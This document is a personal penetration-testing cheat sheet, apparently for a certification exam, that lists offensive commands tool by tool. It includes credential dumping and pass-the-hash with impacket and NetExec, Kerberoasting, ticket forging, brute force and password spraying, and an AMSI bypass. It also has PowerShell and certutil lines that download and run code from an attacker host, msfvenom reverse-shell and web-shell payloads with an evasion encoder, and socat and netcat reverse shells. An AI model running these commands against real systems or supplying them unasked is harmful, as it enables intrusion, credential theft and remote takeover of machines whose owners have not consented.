# Personal Command Reference

A condensed reference of the commands you reach for routinely. Organised by tool, with the exam-relevant flags and patterns prioritised.

## nmap

### Scan modes

```bash
# TCP SYN scan, default scripts, version detection
sudo nmap -sCV 10.10.10.50

# Full TCP port scan, fast rate, no DNS, treat as up
sudo nmap -sS -p- --min-rate 5000 -n -Pn 10.10.10.50

# UDP top 100 ports (UDP is slow - don't run all 65535)
sudo nmap -sU --top-ports 100 10.10.10.50

# Specific ports
sudo nmap -p 22,80,443,3306,5432 10.10.10.50

# Aggressive (OS, version, scripts, traceroute) - noisy
sudo nmap -A 10.10.10.50

# Save all output formats
sudo nmap -sCV 10.10.10.50 -oA scan_results

# Multiple targets from file
sudo nmap -sCV -iL hosts.txt -oA bulk_scan

# IPv6
sudo nmap -6 -sCV fe80::1%eth0
```

### Two-stage scan pattern (use this always)

```bash
# Stage 1: fast all-port discovery
sudo nmap -sS -p- --min-rate 5000 -n -Pn 10.10.10.50 -oN ports.nmap

# Extract open ports
ports=$(grep '/tcp.*open' ports.nmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')

# Stage 2: detailed scan only on those ports
sudo nmap -sCV -p "$ports" 10.10.10.50 -oN detail.nmap
```

### NSE script categories

```bash
sudo nmap --script default 10.10.10.50           # = -sC
sudo nmap --script vuln 10.10.10.50              # vulnerability checks
sudo nmap --script auth 10.10.10.50
sudo nmap --script discovery 10.10.10.50

# Service-specific bundles
sudo nmap --script "smb-*" -p 445 10.10.10.50
sudo nmap --script "http-*" -p 80,443 10.10.10.50
sudo nmap --script "ssl-*" -p 443 10.10.10.50
sudo nmap --script "dns-*" -p 53 10.10.10.50
sudo nmap --script "ftp-*" -p 21 10.10.10.50

# Targeted critical scripts
sudo nmap --script smb-vuln-ms17-010 -p 445 10.10.10.50
sudo nmap --script smb-os-discovery,smb-protocols -p 445 10.10.10.50
sudo nmap --script ldap-rootdse -p 389 10.10.10.50
sudo nmap --script http-enum,http-title,http-headers -p 80 10.10.10.50
```

### Timing and evasion

```bash
sudo nmap -T4 10.10.10.50                        # aggressive timing (default for exams)
sudo nmap --min-rate 5000 10.10.10.50            # at least 5000 packets/sec
sudo nmap --max-retries 1 10.10.10.50            # don't retry timeouts (faster)
sudo nmap -f 10.10.10.50                         # fragment packets
sudo nmap --source-port 53 10.10.10.50           # spoof source port
sudo nmap -D RND:5,ME 10.10.10.50                # decoys
```

### Output filtering

```bash
sudo nmap --open 10.10.10.50                     # only show open ports

# Extract IPs of hosts with port 445 open from grepable output
grep "445/open" scan.gnmap | awk '{print $2}'

# Extract just open ports per host
nmap -oG - 10.10.10.0/24 -p 445 --open | grep "Ports:" | awk '{print $2}'
```

## ffuf

```bash
# Directory enumeration (most common)
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With extensions
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak,.zip

# Filter by status code
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403       # match codes
ffuf -u http://target/FUZZ -w wordlist.txt -fc 404                   # filter codes

# Filter by response size/words/lines (for soft 404s)
ffuf -u http://target/FUZZ -w wordlist.txt -fs 1234                  # filter size
ffuf -u http://target/FUZZ -w wordlist.txt -fw 7                     # filter words
ffuf -u http://target/FUZZ -w wordlist.txt -fl 30                    # filter lines

# Recursion
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Vhost / subdomain enumeration
ffuf -u http://target/ -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 0

# Parameter discovery (GET)
ffuf -u "http://target/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

# Parameter value fuzzing
ffuf -u "http://target/page?id=FUZZ" -w numbers.txt

# POST body fuzzing
ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fc 401

# Multiple wordlists
ffuf -u http://target/FUZZ1/FUZZ2 -w dirs.txt:FUZZ1 -w files.txt:FUZZ2

# Custom headers
ffuf -u http://target/FUZZ -w wordlist.txt -H "Cookie: session=abc123"
ffuf -u http://target/FUZZ -w wordlist.txt -H "Authorization: Bearer TOKEN"

# Threading and rate
ffuf -u http://target/FUZZ -w wordlist.txt -t 50                     # 50 threads
ffuf -u http://target/FUZZ -w wordlist.txt -p 0.1                    # 0.1 sec delay

# Output
ffuf -u http://target/FUZZ -w wordlist.txt -o results.json -of json
```

## feroxbuster

```bash
# Basic with extensions
feroxbuster -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Recursive with depth
feroxbuster -u http://target/ -w wordlist.txt -d 3 -t 50

# Filter
feroxbuster -u http://target/ -w wordlist.txt -C 404 -S 1234

# Resume scan
feroxbuster --resume-from ferox.state
```

## gobuster

```bash
# Directory mode
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# DNS subdomain mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Vhost mode
gobuster vhost -u http://target/ -w wordlist.txt --append-domain
```

## sqlmap

```bash
# GET parameter
sqlmap -u "http://target/page.php?id=1" --batch

# All parameters in URL
sqlmap -u "http://target/page.php?id=1&cat=2" --batch

# POST data
sqlmap -u "http://target/login.php" --data "user=admin&pass=test" --batch

# From a Burp request file (most reliable)
sqlmap -r request.txt --batch

# Cookie injection
sqlmap -u "http://target/" --cookie "session=abc; pref=def" --level 2

# Header injection
sqlmap -u "http://target/" --header "User-Agent: *" --level 3

# Aggressive
sqlmap -u "..." --level 5 --risk 3 --batch

# Specific parameter only
sqlmap -u "..." -p id

# Specific technique only (B/E/U/S/T/Q)
sqlmap -u "..." --technique=BU

# Force DBMS (skips fingerprinting)
sqlmap -u "..." --dbms=mysql

# Enumeration
sqlmap -u "..." --batch --dbs                            # databases
sqlmap -u "..." --batch -D dbname --tables               # tables in db
sqlmap -u "..." --batch -D dbname -T users --columns     # columns
sqlmap -u "..." --batch -D dbname -T users --dump        # dump table
sqlmap -u "..." --batch --current-db
sqlmap -u "..." --batch --current-user
sqlmap -u "..." --batch --is-dba
sqlmap -u "..." --batch --hostname
sqlmap -u "..." --batch --privileges
sqlmap -u "..." --batch --passwords                      # dump password hashes

# OS shell (when DB allows)
sqlmap -u "..." --batch --os-shell
sqlmap -u "..." --batch --os-pwn

# File operations
sqlmap -u "..." --batch --file-read=/etc/passwd
sqlmap -u "..." --batch --file-write=local.php --file-dest=/var/www/html/shell.php

# Use Tor / proxy
sqlmap -u "..." --proxy=http://127.0.0.1:8080            # through Burp

# Verbose
sqlmap -u "..." -v 3                                      # show payloads
```

## hydra

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://10.10.10.50 -t 4 -V

# FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.50

# SMB
hydra -L users.txt -P passwords.txt smb://10.10.10.50

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.50

# HTTP Basic auth
hydra -L users.txt -P passwords.txt http-get://10.10.10.50/admin/

# HTTP POST form (the tricky one)
hydra -l admin -P passwords.txt 10.10.10.50 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
# F=  failure indicator string
# S=  success indicator string

# HTTPS POST form
hydra -l admin -P passwords.txt 10.10.10.50 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"

# MySQL
hydra -L users.txt -P passwords.txt mysql://10.10.10.50

# PostgreSQL
hydra -L users.txt -P passwords.txt postgres://10.10.10.50

# MSSQL
hydra -L users.txt -P passwords.txt mssql://10.10.10.50

# Telnet
hydra -L users.txt -P passwords.txt telnet://10.10.10.50

# VNC (no username, only password)
hydra -P passwords.txt vnc://10.10.10.50
```

## NetExec / CrackMapExec

`nxc` is the modern fork of `cme` (CrackMapExec). On Kali both may be available.

```bash
# Basic auth check
nxc smb 10.10.10.50 -u user -p pass
nxc smb 10.10.10.0/24 -u user -p pass --continue-on-success    # spray

# Local auth (vs domain)
nxc smb 10.10.10.50 -u admin -p pass --local-auth

# Pass the hash
nxc smb 10.10.10.50 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# Enumeration (with creds)
nxc smb 10.10.10.50 -u user -p pass --shares
nxc smb 10.10.10.50 -u user -p pass --users
nxc smb 10.10.10.50 -u user -p pass --groups
nxc smb 10.10.10.50 -u user -p pass --pass-pol
nxc smb 10.10.10.50 -u user -p pass --loggedon-users
nxc smb 10.10.10.50 -u user -p pass --rid-brute
nxc smb 10.10.10.50 -u user -p pass --sessions

# Run a command
nxc smb 10.10.10.50 -u admin -p pass -x 'whoami /priv'
nxc smb 10.10.10.50 -u admin -p pass -X 'Get-Process'         # PowerShell

# Modules
nxc smb 10.10.10.50 -u admin -p pass -M lsassy                 # dump LSASS
nxc smb 10.10.10.50 -u admin -p pass -M mimikatz
nxc smb 10.10.10.50 -u user -p pass -M gpp_password            # GPP cpassword
nxc smb 10.10.10.50 -u user -p pass -M spider_plus             # spider shares
nxc smb 10.10.10.50 -u user -p pass -L                         # list modules

# Generate relay target list (hosts without SMB signing required)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# Other protocols
nxc winrm 10.10.10.50 -u user -p pass
nxc ssh 10.10.10.50 -u user -p pass
nxc mssql 10.10.10.50 -u sa -p pass --local-auth -q "SELECT @@version"
nxc ldap 10.10.10.50 -u user -p pass --kerberoasting krb.txt
nxc ldap 10.10.10.50 -u user -p pass --asreproast asrep.txt
nxc ftp 10.10.10.50 -u anonymous -p ''
```

## hashcat

```bash
# Basic invocation
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Mask attack (mode -a 3)
hashcat -m <mode> hashes.txt -a 3 ?u?l?l?l?l?l?d?d            # Aaaaaa11
hashcat -m <mode> hashes.txt -a 3 ?l?l?l?l?l?l?l?l            # 8 lower
hashcat -m <mode> hashes.txt -a 3 'Password!?d?d?d'           # specific prefix

# Hybrid (wordlist + mask)
hashcat -m <mode> hashes.txt -a 6 rockyou.txt ?d?d?d?d        # word + 4 digits

# Show cracked
hashcat --show -m <mode> hashes.txt

# Common modes (memorise these)
# 0     MD5
# 100   SHA1
# 1000  NTLM
# 1400  SHA-256
# 1700  SHA-512
# 1800  sha512crypt ($6$)
# 500   md5crypt ($1$)
# 7400  sha256crypt ($5$)
# 3200  bcrypt ($2y$)
# 5500  NetNTLMv1
# 5600  NetNTLMv2
# 13100 Kerberos TGS-REP RC4
# 18200 Kerberos AS-REP
# 2100  DCC2 (cached domain logon)
# 1731  MSSQL 2012+
# 300   MySQL 4.1+
# 16500 JWT HS256
# 22921 SSH key (bcrypt-pbkdf)

# Common masks
# ?l = lowercase   ?u = uppercase   ?d = digit
# ?s = special     ?a = all         ?h = hex lower    ?H = hex upper
```

## john (the ripper)

```bash
john --wordlist=rockyou.txt hash.txt
john --format=NT hash.txt --wordlist=rockyou.txt
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
john --format=netntlmv2 capture.txt --wordlist=rockyou.txt

# Show cracked
john --show hash.txt

# Combine /etc/passwd and /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt

# Convert formats to john format
ssh2john id_rsa > id_rsa.hash
zip2john secret.zip > secret.hash
rar2john secret.rar > secret.hash
pdf2john secret.pdf > secret.hash
keepass2john Database.kdbx > kdbx.hash
office2john document.docx > office.hash
```

## impacket suite

```bash
# Authentication: <DOMAIN>/<USER>:<PASS>@<TARGET> for password
#                 -hashes :NTLM_HASH for pass-the-hash
#                 -k for Kerberos (with KRB5CCNAME set)

# SMB enumeration
impacket-smbexec corp.local/admin:'Password!'@10.10.10.50
impacket-smbclient corp.local/admin:'Password!'@10.10.10.50

# Command execution
impacket-psexec corp.local/admin:'Password!'@10.10.10.50
impacket-wmiexec corp.local/admin:'Password!'@10.10.10.50
impacket-atexec corp.local/admin:'Password!'@10.10.10.50 'whoami'
impacket-dcomexec corp.local/admin:'Password!'@10.10.10.50

# Pass the hash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.50

# Credential dumping
impacket-secretsdump corp.local/admin:'Password!'@10.10.10.50
impacket-secretsdump -just-dc-ntlm corp.local/admin:'Password!'@10.10.10.10
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:'Password!'@10.10.10.10
impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY

# Kerberos attacks
impacket-GetUserSPNs -dc-ip 10.10.10.10 -request corp.local/user:'Password!'
impacket-GetNPUsers -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt -no-pass -format hashcat
impacket-GetNPUsers -dc-ip 10.10.10.10 corp.local/user:'Password!' -request

# RPC operations
impacket-rpcdump @10.10.10.50
impacket-lookupsid corp.local/user:'Password!'@10.10.10.50
impacket-rpcclient corp.local/user:'Password!'@10.10.10.50

# Database
impacket-mssqlclient sa:'Password!'@10.10.10.50
impacket-mssqlclient -windows-auth corp.local/user:'Password!'@10.10.10.50

# Server tools (for relay attacks)
sudo impacket-smbserver share /tmp/share -smb2support
sudo impacket-smbserver share /tmp/share -smb2support -username sm -password sm
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
sudo impacket-ntlmrelayx -t smb://10.10.10.50 -c 'powershell -enc B64' -smb2support

# Ticket forging
impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain corp.local fakeuser
impacket-getTGT corp.local/user:'Password!'
export KRB5CCNAME=user.ccache

# Other
impacket-GetADUsers -all corp.local/user:'Password!'
impacket-getArch -target 10.10.10.50
```

## responder

```bash
# Capture mode (LLMNR/NBT-NS poisoning)
sudo responder -I eth0 -wrf

# Analysis only (don't poison)
sudo responder -I eth0 -A

# Logs at:
ls -la /usr/share/responder/logs/

# When using ntlmrelayx, edit /etc/responder/Responder.conf:
# [Responder Core]
# SMB = Off
# HTTP = Off
```

## evil-winrm

```bash
# Password
evil-winrm -i 10.10.10.50 -u user -p 'Password!'

# Pass the hash
evil-winrm -i 10.10.10.50 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

# With Kerberos
evil-winrm -i 10.10.10.50 -r CORP.LOCAL                      # uses cache

# In session:
*Evil-WinRM* PS> upload localfile.exe C:\Windows\Temp\f.exe
*Evil-WinRM* PS> download C:\Users\admin\f.txt /tmp/f.txt
*Evil-WinRM* PS> menu                                        # see commands
*Evil-WinRM* PS> Bypass-4MSI                                 # AMSI bypass
*Evil-WinRM* PS> Invoke-Binary /opt/winPEAS.exe              # in-mem run
```

## kerbrute

```bash
# Username enum (no creds needed - and doesn't lock accounts)
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

# Password spray
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Spring2025!'

# Brute force one user
kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt jdoe
```

## bloodhound-python

```bash
# Collect all data
bloodhound-python -u user -p 'Password!' -d corp.local -ns 10.10.10.10 -c All

# Specific collection methods
bloodhound-python -u user -p 'Password!' -d corp.local -ns 10.10.10.10 \
  -c Group,LocalAdmin,Session,Trusts,ACL,Container,RDP,DCOM,PSRemote

# With hash
bloodhound-python -u user --hashes :NTLM_HASH -d corp.local -ns 10.10.10.10 -c All
```

## smbclient / smbmap

```bash
# List shares
smbclient -L //10.10.10.50/ -N                             # null session
smbclient -L //10.10.10.50/ -U 'CORP\user%pass'

# Connect to share
smbclient //10.10.10.50/Share -N
smbclient //10.10.10.50/C$ -U 'CORP\admin%Password!'

# In smbclient:
smb: \> ls
smb: \> get filename
smb: \> put localfile
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

# smbmap (better view of permissions)
smbmap -H 10.10.10.50 -u guest -p ''
smbmap -H 10.10.10.50 -u admin -p 'Password!' -R Share          # recursive
smbmap -H 10.10.10.50 -u admin -p 'Password!' -R Share -A '.*\.txt'   # match
smbmap -H 10.10.10.50 -u admin -p 'Password!' --download 'Share/file.txt'
smbmap -H 10.10.10.50 -u admin -p 'Password!' --upload local.txt 'Share/remote.txt'
```

## enum4linux-ng

```bash
enum4linux-ng -A 10.10.10.50                              # all
enum4linux-ng -U -G -S -P 10.10.10.50                     # users, groups, shares, policy
enum4linux-ng -R 10.10.10.50                              # RID cycling
enum4linux-ng -A -u 'user' -p 'pass' 10.10.10.50          # authenticated
```

## ldapsearch

```bash
# Anonymous RootDSE query
ldapsearch -x -H ldap://10.10.10.10 -s base -b "" "(objectClass=*)" "*" "+"

# All users
ldapsearch -x -H ldap://10.10.10.10 -D 'CORP\user' -w 'pass' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Domain Admins members
ldapsearch -x -H ldap://10.10.10.10 -D 'CORP\user' -w 'pass' \
  -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)"

# Computers
ldapsearch -x -H ldap://10.10.10.10 -D 'CORP\user' -w 'pass' \
  -b "DC=corp,DC=local" "(objectClass=computer)" name dNSHostName operatingSystem

# Users with description (often contains passwords)
ldapsearch -x -H ldap://10.10.10.10 -D 'CORP\user' -w 'pass' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description | grep -A1 description
```

## windapsearch

```bash
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' -U     # users
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' -G     # groups
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' -C     # computers
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' --da   # domain admins
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' --privileged-users
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' --gpos
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p 'pass' --trusts
```

## snmpwalk / snmp-check

```bash
# Quick scan for community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.50

# Full walk
snmpwalk -v2c -c public 10.10.10.50

# Specific subtree
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.1                 # system info
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.4.2.1.2        # processes
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.6.3.1.2        # software
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.77.1.2.25         # Win users
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.9.9.96.1.1.1      # Cisco config

# snmp-check formats nicely
snmp-check -c public 10.10.10.50
```

## dig / nslookup / whois

```bash
# Standard records
dig A example.com
dig MX example.com
dig NS example.com
dig TXT example.com
dig ANY example.com @ns1.example.com

# Reverse
dig -x 8.8.8.8

# Zone transfer
dig AXFR example.com @ns1.example.com

# Subdomain via nameserver
dig @ns1.example.com subdomain.example.com

# DNS recon tools
dnsrecon -d example.com -t std,axfr
dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsenum --enum example.com
fierce --domain example.com
```

## Burp Suite Pro

```bash
# Start Burp from command line (Kali)
burpsuite

# Common workflow:
# 1. Set browser proxy to 127.0.0.1:8080
# 2. Install Burp CA cert in browser
# 3. Browse the target -> Burp captures all requests in Proxy > HTTP history
# 4. Right-click an interesting request:
#    - Send to Repeater (manual modification + replay)
#    - Send to Intruder (automated fuzzing)
#    - Send to Decoder (encoding/decoding)
#    - Send to Comparer (diff two responses)

# Intruder attack types:
# - Sniper: single payload set, one position at a time
# - Battering ram: single payload set, all positions same value
# - Pitchfork: parallel payload sets, paired
# - Cluster bomb: cartesian product (all combinations)

# Save copy of requests:
# Proxy > HTTP history > select request > right-click > Copy to file (use for sqlmap -r)
```

## File transfer

### Linux victim → attacker

```bash
# Attacker
python3 -m http.server 80
sudo php -S 0.0.0.0:80
nc -lvnp 4444 < file.sh                           # send
nc -lvnp 4444 > received.bin                      # receive

# Victim
curl http://10.10.14.5/file.sh -o file.sh
wget http://10.10.14.5/file.sh
nc 10.10.14.5 4444 > file.sh                      # receive from listener
nc 10.10.14.5 4444 < file.sh                      # send to listener
```

### Windows victim ← Linux attacker

```bash
# Attacker
python3 -m http.server 80
sudo impacket-smbserver share /tmp/share -smb2support
```

```cmd
:: Victim cmd.exe
certutil -urlcache -split -f http://10.10.14.5/file.exe file.exe
bitsadmin /transfer mydl http://10.10.14.5/file.exe C:\Temp\file.exe
copy \\10.10.14.5\share\file.exe C:\Temp\file.exe

:: Direct execution from SMB share
\\10.10.14.5\share\file.exe
```

```powershell
# Victim PowerShell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.5/f.exe","C:\Temp\f.exe")
Invoke-WebRequest http://10.10.14.5/f.exe -OutFile C:\Temp\f.exe
iwr http://10.10.14.5/f.exe -OutFile C:\Temp\f.exe

# In-memory PowerShell execution (no disk write)
IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/script.ps1")
IEX (iwr http://10.10.14.5/script.ps1 -UseBasicParsing).Content
```

## msfvenom payloads

```bash
# Linux reverse shells
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows reverse shells
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# Service binary (replaces a Windows service)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o svc.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll

# MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o malicious.msi

# Web shells
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > shell.aspx

# PowerShell encoded
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1

# Encoded shellcode (raw bytes)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python

# Encoder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
```

## Listeners

```bash
# Plain
nc -lvnp 4444
ncat -lvnp 4444

# With rlwrap (better terminal handling)
rlwrap nc -lvnp 4444

# pwncat-cs (auto-stabilises shells)
pwncat-cs -lp 4444

# socat (full PTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
```

## Shell stabilisation (Linux)

```bash
# Method 1: python pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm-256color
stty rows 40 cols 120

# Method 2: socat (cleanest)
# On listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# In victim shell, retry the rev shell with socat:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444

# Method 3: script
script /dev/null -c bash
```

## Common one-liners

```bash
# Find IPs that responded to ping (cleaner than nmap output)
fping -a -g 10.10.10.0/24 2>/dev/null

# Quick port check across subnet
for ip in 10.10.10.{1..254}; do (nc -zv -w 1 $ip 22 2>&1 | grep -i succeeded &); done

# Generate password hash
openssl passwd -1 -salt salt password                       # md5crypt $1$
openssl passwd -6 -salt salt password                       # sha512crypt $6$
mkpasswd -m sha-512 password

# Base64 encode/decode
echo -n "string" | base64
echo "c3RyaW5n" | base64 -d

# URL encode/decode (Python)
python3 -c "import urllib.parse; print(urllib.parse.quote('string with spaces'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('hello%20world'))"

# Hex encode/decode
echo -n "string" | xxd -p
echo "737472696e67" | xxd -r -p

# Base64 a binary file (e.g. for payload upload)
base64 -w0 payload.bin > payload.b64

# Make a file world-readable for nc transfer
chmod a+r file
```

## Quick context checks (any new shell)

```bash
# Linux foothold first 5
id
uname -a
sudo -l
find / -perm -u=s -type f 2>/dev/null
crontab -l; cat /etc/crontab

# Windows foothold first 5
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net localgroup administrators
wmic service get name,displayname,pathname,startmode | findstr /v """
```
